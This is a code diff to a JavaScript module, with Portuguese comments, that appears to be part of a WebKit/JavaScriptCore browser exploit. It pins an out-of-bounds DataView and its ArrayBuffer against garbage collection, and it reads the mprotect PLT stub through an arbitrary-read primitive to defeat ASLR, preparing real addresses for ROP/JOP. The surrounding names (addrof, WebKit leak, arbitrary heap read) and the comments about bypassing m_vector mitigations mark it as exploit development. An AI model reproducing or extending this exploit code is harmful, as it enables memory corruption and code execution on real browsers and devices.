@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v17 - Fortificando Alocacao OOB - Reforço no Teste)
+// js/script3/testArrayBufferVictimCrash.mjs (v18 - Fortificando Alocacao OOB - Retenção de Referências)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v17 - Fortificando Alocacao OOB - Reforco no Teste"; // Versão atualizada
+export const FNAME_MODULE = "v18 - Fortificando Alocacao OOB - Retencao de Referencias"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -354,6 +354,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await triggerOOB_primitive({ force_reinit: true });
 
         const oob_data_view = getOOBDataView();
+        const oob_array_buffer = oob_data_view.buffer; // Obtenha a referência ao ArrayBuffer real
+        hold_objects.push(oob_array_buffer); // Mantenha o ArrayBuffer real referenciado para evitar GC
+        hold_objects.push(oob_data_view); // Mantenha o DataView real referenciado para evitar GC
+
         if (!oob_data_view) {
             const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
             logFn(errMsg, "critical");
@@ -494,12 +498,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
         logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
         if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
-            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes)}. ASLR validado!`, "good");
         } else {
-             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
         }
-
-        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
